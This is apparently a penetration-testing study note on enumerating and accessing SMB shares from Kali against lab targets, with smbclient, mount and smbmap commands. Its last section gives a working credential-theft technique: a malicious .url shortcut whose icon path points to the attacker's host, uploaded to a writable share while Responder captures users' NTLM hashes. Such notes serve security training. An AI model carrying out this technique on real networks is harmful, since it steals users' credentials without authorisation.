refer to [[Active Information Gathering]]for enumeration

list shares from Kali:
`smbclient -N -L 10.10.11.174` 
- `-N`: no password
`smbclient -L //192.168.171.21 -U Fiona.Clark`

Connect to a share from Kali:
`smbclient -N //10.10.11.174/support-tools`
commands to use: `dir`, `get [filename]` (like ftp)

Mount a share:
`sudo mkdir /mnt/myFolder`
`sudo mount -t cifs  //10.10.11.174/support-tools /mnt/myFolder/`

Download all files in share (after connecting to it):
`recurse ON`
`prompt OFF`
`mget *`

List all files the user has access to on the SMB:
`smbmap -d active.htb -u [username] -p [password] -H [target ip] -R [name of share]`

Write a file to SMB share:
`put [filename from local]`

## Writeable share exploit
As this is a Windows host, we can use the SMB share access to upload a file that the target system will interpret as a Windows shortcut. In this file, we can specify an icon that points to our Kali host. This should allow us to capture the user's NTLM hash when it is accessed.

1. We'll create a file named @hax.url with the following contents.
```
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\[kali ip]\%USERNAME%.icon
IconIndex=1
```
2. Before uploading the file to the SMB share, let's start `responder` to listen for the request.
	`sudo responder -I tun0 -v`
3. Upload our file to the SMB share:
	`put @hax.url`
4. NTLM hash will be captured by responder after a while.